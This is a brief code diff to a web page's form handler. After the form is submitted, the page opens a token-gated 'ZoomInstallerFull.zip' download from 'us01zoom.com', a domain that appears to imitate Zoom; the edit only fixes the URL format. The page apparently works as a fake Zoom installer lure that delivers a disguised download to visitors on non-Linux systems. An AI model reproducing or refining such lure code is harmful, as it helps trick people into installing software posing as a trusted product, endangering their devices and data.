@@ -68,7 +68,7 @@ protectedForm.addEventListener("submit", async function(e) {
 		} else if (osCategory == "Linux") {
 			textLinux.style.display = 'block'
 		} else {
-			const downloadUrl = `https://us01zoom.com/download/ZoomInstallerFull.zip?token=${encodeURIComponent(result.token)}/`;
+			const downloadUrl = `https://us01zoom.com/download/ZoomInstallerFull.zip?token=${encodeURIComponent(result.token)}`;
 			window.open(downloadUrl, '_blank')
 		}
 	}
